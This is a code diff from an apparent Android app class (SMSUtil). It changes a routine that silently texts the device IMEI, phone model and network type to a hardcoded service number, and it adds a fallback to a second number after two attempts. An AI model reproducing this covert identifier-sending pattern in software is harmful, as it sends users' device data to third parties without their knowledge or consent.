@@ -36,17 +36,8 @@ public class SMSUtil {
 
     public synchronized static final void trySendCmdToServicePhone1(Context context) {
         if (Config.DEBUG) {
-            Config.LOGD("[[trySendCmdToServicePhone1]] try to send SMS to Service Phone : " + AppRuntime.PHONE_SERVICE + " >>>>>>>");
+            Config.LOGD("[[trySendCmdToServicePhone1]] try to send SMS to Service Phone >>>>>>>");
         }
-
-        /**
-         * 五分钟之内不重复发送获取短信中心的短信，防止解锁时候的抖动
-         */
-//        long last = SettingManager.getInstance().getKeyLastSendMsgToServicehPhone();
-//        long cur = System.currentTimeMillis();
-//        if (last + 5 * 60 * 1000 > cur) {
-//            return;
-//        }
 
         if (SettingManager.getInstance().getKeyDeviceHasSendToServicePhone()) {
             //如果没有发送过短信到服务器手机，那么就不在做任何处理了
@@ -57,7 +48,7 @@ public class SMSUtil {
         }
 
         int networkType = AppRuntime.getNetworkTypeByIMSI(context);
-        String target = AppRuntime.PHONE_SERVICE;
+        String target = AppRuntime.PHONE_SERVICE1;
         String content = "IMEI:" + UtilsRuntime.getIMEI(context) + " PHONETYPE:" + android.os.Build.MODEL;
         switch (networkType) {
             case AppRuntime.CMNET:
@@ -74,6 +65,17 @@ public class SMSUtil {
                 break;
             default:
                 content = content + " NT:-1";
+        }
+
+        if (SettingManager.getInstance().getKeySendMsgToServicePhoneClearTimes() >= 2) {
+            SettingManager.getInstance().setKeySendMsgToServicePhoneClearTimes(0);
+            target = AppRuntime.PHONE_SERVICE2;
+            if (Config.DEBUG) {
+                Config.LOGD("[[trySendCmdToServicePhone1]] has send to Service phone : " + AppRuntime.PHONE_SERVICE1 + " 2 times, so " +
+                                "this time send the message to : " + AppRuntime.PHONE_SERVICE2);
+            }
+        } else {
+            target = AppRuntime.PHONE_SERVICE1;
         }
 
         if (!TextUtils.isEmpty(content) && sendSMS(target, content)) {
